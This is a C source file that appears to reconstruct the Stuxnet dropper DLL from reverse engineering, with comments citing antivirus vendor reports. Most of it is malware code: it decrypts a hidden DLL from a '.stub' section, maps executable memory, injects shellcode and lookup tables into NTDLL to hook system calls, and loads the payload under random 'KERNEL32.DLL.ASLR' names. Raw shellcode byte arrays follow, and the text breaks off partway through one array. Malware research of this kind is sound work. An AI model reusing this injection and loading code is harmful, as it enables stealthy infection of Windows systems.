/******************************************************************************************
  Copyright 2012 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

#include "data.h"

extern const char NTDLL_HEADER_SHELLCODE[41];
extern const char NTDLL_TABLE[206];
extern const char NTDLL_TABLE2[915];

extern const HMODULE NTDLL_DLL;

extern const _tlstrcmpiW             _lstrcmpiW;
extern const _tVirtualQuery          _VirtualQuery;
extern const _tVirtualProtect        _VirtualProtect;
extern const _tGetProcAddress        _GetProcAddress;
extern const _tMapViewOfFile         _MapViewOfFile;
extern const _tUnmapViewOfFile       _UnmapViewOfFile;
extern const _tFlushInstructionCache _FlushInstructionCache;
extern const _tLoadLibraryW          _LoadLibraryW;
extern const _tFreeLibrary           _FreeLibrary;
extern const _tZwCreateSection       _ZwCreateSection;
extern const _tZwMapViewOfSection    _ZwMapViewOfSection;
extern const _tCreateThread          _CreateThread;
extern const _tWaitForSingleObject   _WaitForSingleObject;
extern const _tGetExitCodeThread     _GetExitCodeThread;
extern const _tZwClose               _ZwClose;

void StartInfection(void);

void DecryptRVASection(char *pSectionRVA, unsigned int pSectionVirtualSize);
int  LocateRVASection(int *pSectionRVA, int *pSectionVirtualSize);

void CheckSystemVersion(_DWORD _unused);
char *__usercall UnusedFunction(unsigned int a1, int a2);
int __thiscall DecodeEncryptedModuleNames(DWORD dwOld);
int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSectionHandle, PVOID *ZwCurrentProcessBaseAddress, PVOID *ZwModuleProcessBaseAddress);
void _ZwMoveSectionPointer(void **ZwSectionAddr1, void *ZwSectionAddr2, int *ZwSectionPointer, int *ZwInformation, const void *ZwSectionContent, unsigned int ZwSectionSize);
int GetRandomModuleName(int *sModuleInfo, LPCWSTR szRandomLibraryName);
int _ZwReplaceSection(HANDLE hProcessHandle, const void *sModuleInfo, const void *InSection2, unsigned int InSize2, int a5, const void *InSection1, unsigned int InSize1, void **OutPointer);

int sub_100016A5(int a1, void *a2, const void *a3);

UINT32 GetNTDLLCodeShellcodeSize(void);
UINT32 GetNTDLLCodeShellcode(void);
UINT32 GetRealtivePositionOfFunc1(void);
UINT32 GetRealtivePositionOfFunc3(void);

int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4);
int InfectSystem(LPCWSTR szRandomModuleName, const void *pPE, unsigned int iSize, HMODULE *a4);

void DecodeModuleNameA(const char *pEncodedFunctionName, char *pDecodedFunctionName);
void DecodeModuleNameW(const WCHAR *pEncodedModuleName, WCHAR *pDecodedModuleName);

HMODULE GetModuleNTDLL();
FARPROC GetFunctionFromModule(const WCHAR *pEncodedModuleName, const char *pEncodedFunctionName);

void __memcpy(void *Dst, const void *Src, size_t Size);

FARPROC GetFunctionFromKERNEL32(const char *pEncodedFunctionName);
FARPROC GetFunctionFromNTDLL(const char *pEncodedFunctionName);

int NTDLL_CODE_SHELLCODE_INIT(int a1);
int __stdcall NTDLL_CODE_SHELLCODE_FUNC1(int a1);
void NTDLL_CODE_SHELLCODE_FUNC2(_DWORD, _DWORD, _DWORD);
int __stdcall NTDLL_CODE_SHELLCODE_FUNC3(int a1);
void NTDLL_CODE_SHELLCODE_FUNC4(void *a1, const void *a2, unsigned int a3);
void NTDLL_CODE_SHELLCODE_FUNC5(const void *a1, int a2, void *a3);
_DWORD NTDLL_CODE_SHELLCODE_FUNC6(_DWORD, _DWORD);
int NTDLL_CODE_SHELLCODE_FUNC7(int a1, int a2, const void *a3, int a4);
void NTDLL_CODE_SHELLCODE_END(void);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1) hINSTANCE = hinstDLL;
	return TRUE;
}

STDAPI DllUnregisterServerEx(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if(fdwReason && fdwReason == 1)
	{
		hINSTANCE = hinstDLL;
		CheckSystemVersion(1);
	}
	
	return 0;
}

STDAPI DllCanUnloadNow(void)
{
	hINSTANCE = GetModuleHandleW(0);
	CheckSystemVersion(1);
	ExitProcess(0);
}

STDAPI DllGetClassObject(const IID *const rclsid, const IID *const riid, LPVOID *ppv)
{
	CheckSystemVersion(1);
}

BOOL WINAPI DllRegisterServerEx(void)
{
	CheckSystemVersion(1);
	return TRUE;
}

STDAPI CPlApplet(int a1)
{
	if(*(_DWORD *)(a1 + 8))
		DeleteFileA(*(LPCSTR *)(a1 + 8));
	CheckSystemVersion(1);
	return 1;
}

STDAPI DllGetClassObjectEx(int a1, int a2, int a3, int a4)
{
	CheckSystemVersion(0);
}

/*************************************************************************
** Here the executable start to infect the system with the decryption   **
** of the dll and its execution in the memory.                          **
*************************************************************************/
void StartInfection(void)
{
	__tMainModuleInit pMainModuleInit; // eax@3
	int pSectionVirtualSize; // [sp+0h] [bp-Ch]@1
	int pSectionRVA; // [sp+4h] [bp-8h]@1
	HMODULE hLibModule; // [sp+8h] [bp-4h]@2

	/* --->> Get the ".stub" section's RVA and Virtual Sizee <<--- */
	if(!LocateRVASection(&pSectionRVA, &pSectionVirtualSize)) return;
	
	
	/* --->> Start to decrypt from the 552 byte <<--- */
	/* --->> Decrypt 49.8176 bytes <<--- */
	DecryptRVASection((char *)(pSectionRVA + *(_DWORD *)pSectionRVA), *(_DWORD *)(pSectionRVA + 4));// (552, 498176)
	if(!InfectSystem(NULL, (const void *)(pSectionRVA + *(_DWORD *)pSectionRVA), *(_DWORD *)(pSectionRVA + 4), &hLibModule)) // (0, 552, 498176, ...)
	{
		pMainModuleInit = (__tMainModuleInit)GetProcAddress(hLibModule, (LPCSTR)0xF);
		if(pMainModuleInit) pMainModuleInit(pSectionRVA, pSectionVirtualSize);
		
		FreeLibrary(hLibModule);
	}
}

/*************************************************************************
** A simple XOR algorithm used to decrypt the encrypted dll located in  **
** the .stub section.                                                   **
*************************************************************************/
void DecryptRVASection(char *pSectionRVA, unsigned int pSectionVirtualSize)
{
	unsigned int iFirstXOR; // edx@2
	unsigned int iSecondXOR; // eax@4
	unsigned int i;
	signed int iTotalCycles; // [sp+8h] [bp-8h]@1
	unsigned int iCyclesSecondXOR; // [sp+Ch] [bp-4h]@1

	iCyclesSecondXOR = pSectionVirtualSize >> 1;
	iTotalCycles = 4;
	do
	{
		iFirstXOR = 0;
		if(pSectionVirtualSize)
		{
			do
			{
				pSectionRVA[iFirstXOR] ^= -106 * iFirstXOR;
				++iFirstXOR;
			}
			while(iFirstXOR < pSectionVirtualSize);
		}
		iSecondXOR = 0;
		if(iCyclesSecondXOR)
		{
			do
			{
				pSectionRVA[iSecondXOR] ^= *(&pSectionRVA[(pSectionVirtualSize + 1) >> 1] + iSecondXOR);
				++iSecondXOR;
			}
			while(iSecondXOR < iCyclesSecondXOR);
		}
		
		for(i = pSectionVirtualSize - 1; i >= 1; --i)
			pSectionRVA[i] -= pSectionRVA[i - 1];
		
		--iTotalCycles;
	}
	while(iTotalCycles >= 0);
}

/*************************************************************************
** This function search the section ".stub" where the encrypted dll is  **
** placed, it searchs the Relativa Virtual Address (RVA) and its        **
** Virtual Size, then it checks for the integrity of the section with   **
** an header. If all it's ok return TRUE, otherwise return FALSE.       **
*************************************************************************/
BOOL LocateRVASection(int *pSectionRVA, int *pSectionVirtualSize)
{
	char *v3; // esi@3
	char *iSectionsPTR; // edi@5
	signed int iCurrentSection; // ebx@5
	unsigned int iSectionVirtualSize; // ecx@10
	int iSectionRVA; // eax@11

	/* --->> Check executable header "MZ" <<--- */
	if(*(_WORD *)hINSTANCE != MZ_HEADER) return FALSE;
	
	/* --->> Get the address of the new executable header (hINSTANCE + 240) <<--- */
	v3 = *((_DWORD *)hINSTANCE + 15) + (char *)hINSTANCE;
	
	/* --->> Check new executable header "PE" <<--- */
	if(*(_DWORD *)v3 != PE_HEADER) return FALSE;
	
	/* --->> Get the address of the PE Section Table (PE header + 224 + 24) <<--- */
	iSectionsPTR = &v3[24 + *((_WORD *)v3 + 10)];
	iCurrentSection = 0;
	
	/* --->> Get the number of sections (5), if it is 0 or negative the function failed <<--- */
	if(*((_WORD *)v3 + 3) <= 0) return FALSE;
	
	/* --->> Search the section ".stub" where the encrypted dll is allocated, if not found the function failed <<--- */
	while(lstrcmpiA(iSectionsPTR, ".stub"))
	{
		++iCurrentSection;
		iSectionsPTR += 40; // Next section
		
		if(iCurrentSection >= *((_WORD *)v3 + 3)) return FALSE;
	}
	
	iSectionVirtualSize = *((_DWORD *)iSectionsPTR + 2);// Get the ".stub" section Virtual Size (503.808 bytes)
	
	/* --->> Check if the Virtual Size is not too small (VirtualSize >= 556)             <<--- */
	/* --->> Get the ".stub" section RVA (Relative Virtual Address) (hINSTANCE + 0x6000) <<--- */
	/* --->> Check the header (DWORD) of the RVA section (0xAE39120D)                    <<--- */
	if(iSectionVirtualSize >= 0x22C && (iSectionRVA = (int)((char *)hINSTANCE + *((_DWORD *)iSectionsPTR + 3)), *(_DWORD *)iSectionRVA == 0xAE39120D))
	{
		/* --->> Remove the header (4 bytes) and put the values in the pointers <<--- */
		*pSectionRVA = iSectionRVA + 4;
		*pSectionVirtualSize = iSectionVirtualSize - 4;
		
		return TRUE;
	}
	
	return FALSE;
}

/*************************************************************************
** This function check that the system is not too old or too new,       **
** it works with all the versions of Windows from Windows 2000 to       **
** Windows 8 included, in the asm code the function is called with a    **
** value (0 and 1) but actually it is not used, maybe it was used in    **
** the past.                                                            **
*************************************************************************/
void CheckSystemVersion(_DWORD a1)
{
	struct _OSVERSIONINFOW VersionInformation; // [sp+0h] [bp-114h]@1

	VersionInformation.dwOSVersionInfoSize = 276;
	
	if(GetVersionExW(&VersionInformation)
	&& VersionInformation.dwPlatformId == 2
	&& (VersionInformation.dwMajorVersion >= 5 || VersionInformation.dwMajorVersion <= 6))
		StartInfection();
}

/*************************************************************************
** Currently this function is unused, maybe it was used in the past     **
** versions of MyRTUs, but in any case I don't understand its function. **
*************************************************************************/
char *__usercall UnusedFunction(unsigned int a1, int a2)
{
	unsigned int i;
	unsigned int v2; // ecx@1
	int v5; // [sp-4h] [bp-4h]@1
	char *v6; // [sp+0h] [bp+0h]@1

	v5 = a2;
	v2 = ~((unsigned int)&(&v6)[-(unsigned __int64)a1] >> 32) & (unsigned int)&(&v6)[-a1];
	
	for(i = (unsigned int)&v5 & 0xFFFFF000; v2 < i; i -= 4096);
	
	return v6;
}

/*************************************************************************
** This function decode the encrypted names of the modules NTDLL.dll    **
** and Kernel32.dll and their own functions. Then it moves the pointer  **
** of the functions, obtained with GetProcAddress() in the their        **
** relative variable, after that the function are hooked (?) according  **
** to the Kaspersky Lab and Symantec reports.                           **
*************************************************************************/
BOOL DecodeEncryptedModuleNames(DWORD dwOld)
{
	DWORD _dwOld; // [sp+0h] [bp-4h]@1

	_dwOld = dwOld;
	if(VirtualProtect((LPVOID)&NTDLL_DLL, 0x44u, 0x80u, &_dwOld) || VirtualProtect((LPVOID)&NTDLL_DLL, 0x44u, 0x40u, &_dwOld))
	{
		*(HMODULE*)NTDLL_DLL = GetModuleNTDLL();
		
		*(UINT32*)_lstrcmpiW             = (UINT32)GetFunctionFromKERNEL32(ENCODED_lstrcmpiW);
		*(UINT32*)_VirtualQuery          = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualQuery);
		*(UINT32*)_VirtualProtect        = (UINT32)GetFunctionFromKERNEL32(ENCODED_VirtualProtect);
		*(UINT32*)_GetProcAddress        = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetProcAddress);
		*(UINT32*)_MapViewOfFile         = (UINT32)GetFunctionFromKERNEL32(ENCODED_MapViewOfFile);
		*(UINT32*)_UnmapViewOfFile       = (UINT32)GetFunctionFromKERNEL32(ENCODED_UnmapViewOfFile);
		*(UINT32*)_FlushInstructionCache = (UINT32)GetFunctionFromKERNEL32(ENCODED_FlushInstructionCache);
		*(UINT32*)_LoadLibraryW          = (UINT32)GetFunctionFromKERNEL32(ENCODED_LoadLibraryW);
		*(UINT32*)_FreeLibrary           = (UINT32)GetFunctionFromKERNEL32(ENCODED_FreeLibrary);
		*(UINT32*)_ZwCreateSection       = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwCreateSection);
		*(UINT32*)_ZwMapViewOfSection    = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwMapViewOfSection);
		*(UINT32*)_CreateThread          = (UINT32)GetFunctionFromKERNEL32(ENCODED_CreateThread);
		*(UINT32*)_WaitForSingleObject   = (UINT32)GetFunctionFromKERNEL32(ENCODED_WaitForSingleObject);
		*(UINT32*)_GetExitCodeThread     = (UINT32)GetFunctionFromKERNEL32(ENCODED_GetExitCodeThread);
		*(UINT32*)_ZwClose               = (UINT32)GetFunctionFromNTDLL(ENCODED_ZwClose);
		
		return TRUE;
	}
	
	return FALSE;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int _ZwOpenMapView(HANDLE ZwModuleProcessHandle, int ZwSectionSize, PHANDLE ZwSectionHandle, PVOID *ZwCurrentProcessBaseAddress, PVOID *ZwModuleProcessBaseAddress)
{
	PSIZE_T ZwViewSize; // [sp+0h] [bp-10h]@1
	NTSTATUS ZwStatus; // [sp+4h] [bp-Ch]@3
	LARGE_INTEGER ZwMaximumSize; // [sp+8h] [bp-8h]@1

	ZwViewSize = ZwSectionSize;
	
	ZwMaximumSize.LowPart  = ZwSectionSize;
	ZwMaximumSize.HighPart = 0;
	
	// (..., 0xF001F, 0, ..., 64, 0x8000000, 0)
	if(_ZwCreateSection(ZwSectionHandle, SECTION_ALL_ACCESS, 0, &ZwMaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0) != STATUS_SUCCESS) return -5;
	
	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, GetCurrentProcess(), ZwCurrentProcessBaseAddress, 0, 0, 0, &ZwViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
	if(ZwStatus != STATUS_SUCCESS) return -5;
	
	// (..., ..., ..., 0, 0, 0, ..., 1, 0, 64)
	ZwStatus = _ZwMapViewOfSection(*(HANDLE *)ZwSectionHandle, ZwModuleProcessHandle, ZwModuleProcessBaseAddress, 0, 0, 0, &ZwViewSize, 1, 0, PAGE_EXECUTE_READWRITE);
	if(ZwStatus != STATUS_SUCCESS) return -5;
	
	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
void _ZwMoveSectionPointer(void **ZwSectionAddr1, void *ZwSectionAddr2, int *ZwSectionPointer, int *ZwInformation, const void *ZwSectionContent, unsigned int ZwSectionSize)
{
	if(ZwSectionSize) __memcpy(*ZwSectionAddr1, ZwSectionContent, ZwSectionSize);

	ZwInformation[0] = (int)((char *)ZwSectionAddr2 + *ZwSectionPointer); // Old ZwSectionAddr2 pointer &ZwSectionAddr2[ZwSectionPointer]
	ZwInformation[1] = ZwSectionSize;						              // Size of the new section
	*ZwSectionAddr1 = (char *)*ZwSectionAddr1 + ZwSectionSize;
	*ZwSectionPointer = ZwSectionSize + *ZwSectionPointer;
}

/*************************************************************************
** This function generate a random name for the dll in the format       **
** KERNEL32.DLL.ASLR.%08x, it also accepts a name passed through the    **
** paramter "szRandomLibraryName", but actually it set to NULL and it's **
** not used, probably it was a feature used in the past versions.       **
*************************************************************************/
int GetRandomModuleName(int *sModuleInfo, LPCWSTR szRandomLibraryName)
{
	WCHAR __KERNEL32_DLL_ASLR_08x[42]; // [sp+8h] [bp-58h]@5
	DWORD iRandom; // [sp+5Ch] [bp-4h]@5

	if(szRandomLibraryName)
	{
		if(lstrlenW(szRandomLibraryName) >= 31) return -1;
		lstrcpyW((LPWSTR)sModuleInfo + 8, szRandomLibraryName);
	}
	else
	{
		iRandom = GetTickCount() + 3 * GetCurrentThreadId();
		DecodeModuleNameW((WCHAR *)ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);
		
		do
			wsprintfW((LPWSTR)sModuleInfo + 8, __KERNEL32_DLL_ASLR_08x, iRandom++);
		while(GetModuleHandleW((LPCWSTR)sModuleInfo + 8));
	}
	
	sModuleInfo[0] = (UINT32)sModuleInfo ^ 0xAE1979DD;
	sModuleInfo[1] = 0;
	sModuleInfo[3] = (UINT32)NTDLL_CODE_SHELLCODE_FUNC3;
	
	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int _ZwReplaceSection(HANDLE hProcessHandle, const void *sModuleInfo, const void *InSection2, unsigned int InSize2, int a5, const void *InSection1, unsigned int InSize1, void **OutPointer)
{
	HANDLE hMapHandle; // [sp+4h] [bp-28h]@1
	char *NewSectionPointer1; // [sp+8h] [bp-24h]@3
	int v11; // [sp+Ch] [bp-20h]@6
	int BaseSectionPointer; // [sp+10h] [bp-1Ch]@1
	void *SectionPointer1; // [sp+14h] [bp-18h]@1
	void *NewSectionPointer2; // [sp+18h] [bp-14h]@3
	unsigned int TotalSize; // [sp+1Ch] [bp-10h]@1
	void *SectionPointer2; // [sp+20h] [bp-Ch]@1
	int *GeneralSectionPointer; // [sp+24h] [bp-8h]@3
	int iOpenMapiFailed; // [sp+28h] [bp-4h]@1

	SectionPointer1 = 0;
	SectionPointer2 = 0;
	
	BaseSectionPointer = 0;
	
	TotalSize = InSize2 + InSize1 + 152;
	
	iOpenMapiFailed = _ZwOpenMapView(hProcessHandle, TotalSize, &hMapHandle, &SectionPointer1, &SectionPointer2);
	if(iOpenMapiFailed) return iOpenMapiFailed;
	
	GeneralSectionPointer = (int *)SectionPointer1;
	SectionPointer1 = (char *)SectionPointer1 + 152;
	BaseSectionPointer = 152;
	
	_ZwMoveSectionPointer(&SectionPointer1, SectionPointer2, &BaseSectionPointer, GeneralSectionPointer + 33, InSection1, InSize1);
	NewSectionPointer1 = (char *)SectionPointer1;
	
	_ZwMoveSectionPointer(&SectionPointer1, SectionPointer2, &BaseSectionPointer, GeneralSectionPointer + 35, InSection2, InSize2);
	NewSectionPointer2 = NewSectionPointer1;
	
	if(InSize2 >= 0x1000 && *(_WORD *)NewSectionPointer2 == 0x5A4D && *((_DWORD *)NewSectionPointer2 + 15) + 248 < InSize2)
	{
		v11 = (int)&NewSectionPointer1[*((_DWORD *)NewSectionPointer2 + 15)];
		if(*(_DWORD *)(v11 + 204) == 72) *(_DWORD *)(v11 + 204) = 64;
	}
	
	__memcpy(GeneralSectionPointer, sModuleInfo, 0x80);
	
	GeneralSectionPointer[37] = a5;
	GeneralSectionPointer[32] = 0;
	
	*OutPointer = SectionPointer2;
	
	_UnmapViewOfFile(GeneralSectionPointer);
	_ZwClose(hMapHandle);

	return 0;
}

/*************************************************************************
** Unknown function.                                                    **
*************************************************************************/
int sub_100016A5(int a1, void *a2, const void *a3)
{
	int v4; // [sp+0h] [bp-90h]@5
	int v5; // [sp+4h] [bp-8Ch]@7
	signed int v6; // [sp+8h] [bp-88h]@1
	unsigned int v7; // [sp+Ch] [bp-84h]@1
	unsigned int Dst[32]; // [sp+10h] [bp-80h]@1

	__memcpy(Dst, a3, 128);
	
	Dst[0] ^= 0xAE1979DD;
	Dst[1] = 0;
	
	v7 = (UINT32)&NTDLL_DLL + *(_DWORD *)(a1 + 8) - (UINT32)&NTDLL_TABLE;
	
	v6 = NTDLL_CODE_SHELLCODE_FUNC7(v7, (int)&Dst, *((const void **)a2 + 35), *((_DWORD *)a2 + 36));
	if(v6) return v6;
	
	if(NTDLL_CODE_SHELLCODE_FUNC6(a1, v7)) return -4;
	
	v4 = (*(int (__stdcall **)(_DWORD))(v7 + 36))(&Dst[4]);
	if(!v4) return -9;
	
	*((_DWORD *)a2 + 32) = v4;
	v5 = Dst[2];
	
	if(Dst[2])
	{
		Dst[2] = 0;
		(*(void (__stdcall **)(int))(v7 + 64))(v5);
	}
	
	return 0;
}

/*************************************************************************
** Function which returns the total size of the functions to inject in  **
** the NTDLL.dll (?) according to the Kaspersky Lab and Symantec        **
** reports.                                                             **
*************************************************************************/
UINT32 GetNTDLLCodeShellcodeSize(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_END - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;// (0x100026A8 - 0x10002060) = 0x648 ---> [1608]
}

/*************************************************************************
** This function returns the pointer to the first function that will be **
** injected in the NTDLL.dll (?) according to the Kaspersky Lab and     **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetNTDLLCodeShellcode(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** This function returns the pointer to the second function that will   **
** be injected in the NTDLL.dll (?) according to the Kaspersky Lab and  **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetRealtivePositionOfFunc1(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_FUNC1 - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** This function returns the pointer to the fourth function that will   **
** be injected in the NTDLL.dll (?) according to the Kaspersky Lab and  **
** Symantec reports.                                                    **
*************************************************************************/
UINT32 GetRealtivePositionOfFunc3(void)
{
	return (UINT32)&NTDLL_CODE_SHELLCODE_FUNC3 - (UINT32)&NTDLL_CODE_SHELLCODE_INIT;
}

/*************************************************************************
** Unknown function. Probably it is the function that inject the new    **
** code in the NTDLL.dll (?) according to the Kaspersky Lab and         **
** Symantec reports.                                                    **
*************************************************************************/
int InfectModuleNTDLL(HANDLE hHandle, void *a2, int *pInjectedCode, int *a4)
{
	void *pShellcode; // eax@3
	HANDLE pSectionHandle; // [sp+8h] [bp-28h]@1
	int iPointerCodeShell; // [sp+Ch] [bp-24h]@3
	int *v9; // [sp+10h] [bp-20h]@3
	int iPointer; // [sp+14h] [bp-1Ch]@1
	void *pCurrentProcessBaseAddr; // [sp+18h] [bp-18h]@1
	unsigned int v12; // [sp+1Ch] [bp-14h]@1
	void *pModuleProcessBaseAddr; // [sp+20h] [bp-10h]@1
	int *pCurrentProcessMapView; // [sp+24h] [bp-Ch]@3
	unsigned int iShellcodeSize; // [sp+28h] [bp-8h]@1
	int iOpenMapViewFailed; // [sp+2Ch] [bp-4h]@1

	pCurrentProcessBaseAddr = 0;
	pModuleProcessBaseAddr = 0;
	
	// var_30 = (0x10001F5E - 0x10001AB9) --> [0x04A5]
	// var_2C = (0x10001AB9 - 0x10001A90) --> [0x0029]
	// var_8  = GetNTDLLCodeShellcodeSize --> [0x648]
	// lea eax, [var_30 + var_2C + 0x24] ---> [0x04F2]
	// add eax, var_8 -----> [0xB3A] (2874)
	// So, the final result is 2874
	
	iShellcodeSize = GetNTDLLCodeShellcodeSize();
	v12 = iShellcodeSize + (UINT32)&DecodeModuleNameA - (UINT32)&NTDLL_TABLE + (UINT32)&NTDLL_TABLE - (UINT32)&NTDLL_HEADER_SHELLCODE + 36; // 2874
	
	iPointer = 0;
	
	iOpenMapViewFailed = _ZwOpenMapView(hHandle, v12, &pSectionHandle, &pCurrentProcessBaseAddr, &pModuleProcessBaseAddr);
	if(iOpenMapViewFailed != STATUS_SUCCESS) return iOpenMapViewFailed;
	
	
	pCurrentProcessMapView = (int *)pCurrentProcessBaseAddr;
	pCurrentProcessBaseAddr = (char *)pCurrentProcessBaseAddr + 36;
	
	iPointer = 36;
	
	// Inject a new table into the NTDLL code (NTDLL_TABLE)
	// &DecodeModuleNameA - &NTDLL_TABLE = [0x04A5] (1189)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 2, NTDLL_TABLE, (UINT32)&DecodeModuleNameA - (UINT32)&NTDLL_TABLE);
	
	iPointerCodeShell = iPointer;
	
	// Inject the shellcode into the NTDLL header (NTDLL_HEADER_SHELLCODE)
	// &NTDLL_TABLE - &NTDLL_HEADER_SHELLCODE = [0x0029] (41)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 6, NTDLL_HEADER_SHELLCODE, (UINT32)&NTDLL_TABLE - (UINT32)&NTDLL_HEADER_SHELLCODE);
	
	pShellcode = (void *)GetNTDLLCodeShellcode();
	
	// Inject the shellcode into the NTDLL code (NTDLL_CODE_SHELLCODE_INIT to NTDLL_CODE_SHELLCODE_END)
	// NTDLL_CODE_SHELLCODE_INIT to NTDLL_CODE_SHELLCODE_END = [0xB3A] (2874)
	_ZwMoveSectionPointer(&pCurrentProcessBaseAddr, pModuleProcessBaseAddr, &iPointer, pCurrentProcessMapView + 4, pShellcode, iShellcodeSize);
	
	// Uknown
	v9 = (int *)((UINT32)&pCurrentProcessMapView + (UINT32)&iPointerCodeShell + (UINT32)&NTDLL_HEADER_SHELLCODE[8] + 2 - (UINT32)&NTDLL_HEADER_SHELLCODE);
	*v9 = (UINT32)&pCurrentProcessMapView[2] + (UINT32)&NTDLL_TABLE2 - (UINT32)&NTDLL_TABLE;
	
	// Uknown
	pCurrentProcessMapView[0] = (UINT32)&pCurrentProcessMapView[4] + GetRealtivePositionOfFunc1();
	pCurrentProcessMapView[1] = (UINT32)&pCurrentProcessMapView[4] + GetRealtivePositionOfFunc3();
	pCurrentProcessMapView[8] = (int)a2;
	
	// Put the values in the pointers
	*pInjectedCode = pCurrentProcessMapView[4]; // Pointer to the injected shellcode in the code
	*a4 = (int)pModuleProcessBaseAddr;
	
	// Close and unmap
	_UnmapViewOfFile(pCurrentProcessMapView);
	_ZwClose(pSectionHandle);
	
	return 0;
}

/*************************************************************************
** This function generate the random name for the encrypted dll and     **
** inject the code into NTDLL.DLL.                                      **
*************************************************************************/
int InfectSystem(LPCWSTR szRandomModuleName, const void *pPE, unsigned int iSize, HMODULE *a4)
{
	DWORD v8; // [sp-4h] [bp-88h]@1
	int v9; // [sp+0h] [bp-84h]@5
	int sModuleInfo[32]; // [sp+4h] [bp-80h]@1

	// Get a random module name with the format "KERNEL32.DLL.ASLR.XXXXXXXX"
	if(!GetRandomModuleName(sModuleInfo, szRandomModuleName) == 0) return 0;
	
	// Decrypt the Kernel32's and NTDLL's function names
	if(bSetup && !DecodeEncryptedModuleNames(v8)) return -12;
	
	v9 = _ZwReplaceSection(GetCurrentProcess(), sModuleInfo, pPE, iSize, -1, 0, 0, &pProcessMapView);
	if(v9) return v9;
	
	if(bSetup)
	{
		v9 = InfectModuleNTDLL(GetCurrentProcess(), pProcessMapView, &pInjectedCodeNTDLL, &pProcessBaseAddress);
		if(v9) return v9;
		
		bSetup = 0;
	}
	
	// Unknown
	v9 = sub_100016A5(pProcessBaseAddress, pProcessMapView, sModuleInfo);
	if(!v9) *a4 = (HMODULE)*((_DWORD *)pProcessMapView + 32);
	
	_UnmapViewOfFile(pProcessMapView);
	
	return v9;
}


/*************************************************************************
** This arrays of code, tables and pointers are stored in the ".text"   **
** section.                                                             **
*************************************************************************/
#pragma code_seg(".text")
#define A_TEXT __declspec(allocate(".text"))
A_TEXT const char NTDLL_HEADER_SHELLCODE[41] = {0x3B, 0x10, 0x49, 0xAB, 0xB2, 0x00, 0xEB, 0x14, 0xB2, 0x01, 0xEB, 0x10, 0xB2, 0x02, 0xEB, 0x0C,
0xB2, 0x03, 0xEB, 0x08, 0xB2, 0x04, 0xEB, 0x04, 0xB2, 0x05, 0xEB, 0x00, 0x52, 0xE8, 0x04, 0x00,
0x00, 0x00, 0x87, 0x1B, 0x00, 0x10, 0x5A, 0xFF, 0x22};

A_TEXT const char NTDLL_TABLE[206] = {0xE8, 0x13, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x4D, 0x61, 0x70, 0x56, 0x69, 0x65, 0x77, 0x4F, 0x66,
0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x04, 0x00, 0x00, 0x00,
0xE8, 0x66, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x10, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x43, 0x72, 0x65,
0x61, 0x74, 0x65, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x08,
0x00, 0x00, 0x00, 0xE8, 0x43, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x0B, 0x00, 0x00, 0x00, 0x5A, 0x77,
0x4F, 0x70, 0x65, 0x6E, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x0C, 0x00, 0x00,
0x00, 0xE8, 0x25, 0x03, 0x00, 0x00, 0x59, 0xE8, 0x08, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x43, 0x6C,
0x6F, 0x73, 0x65, 0x00, 0x5A, 0x51, 0x81, 0xC1, 0x10, 0x00, 0x00, 0x00, 0xE8, 0x0A, 0x03, 0x00,
0x00, 0x59, 0xE8, 0x16, 0x00, 0x00, 0x00, 0x5A, 0x77, 0x51, 0x75, 0x65, 0x72, 0x79, 0x41, 0x74,
0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x73, 0x46, 0x69, 0x6C, 0x65, 0x00, 0x5A, 0x51, 0x81,
0xC1, 0x14, 0x00, 0x00, 0x00, 0xE8, 0xE1, 0x02, 0x00, 0x00, 0x59, 0xE8, 0x0F, 0x00, 0x00, 0x00,
0x5A, 0x77, 0x51, 0x75, 0x65, 0x72, 0x79, 0x53, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x5A,
